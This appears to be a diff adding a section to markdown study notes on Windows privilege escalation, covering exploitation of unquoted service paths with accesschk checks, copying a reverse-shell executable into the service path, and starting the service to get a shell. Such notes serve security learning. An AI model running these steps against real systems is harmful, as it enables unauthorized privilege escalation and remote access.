@@ -296,6 +296,25 @@ It is an hierarchical database used to store information necessary to configure 
 
 ![image](https://github.com/user-attachments/assets/1fa7dbed-e1de-4aa8-9bdb-44ded59ec6a2)
 
+### Unquoted path services
+
+- Exploiting services with unquoted paths
+
+![image](https://github.com/user-attachments/assets/5115d234-5fe0-4daf-af3a-756660097559)
+
+- Use `accesschk /accepteula -uwdq "[service name]"` to check for the user privileges
+
+  ![image](https://github.com/user-attachments/assets/866a466f-3d86-4399-bb13-8087489395e6)
+
+- Copy to the directory and rename with `Common.exe`
+
+      copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+
+- use `net start [service}` to start shell.
+
+
+
+
 
 
   
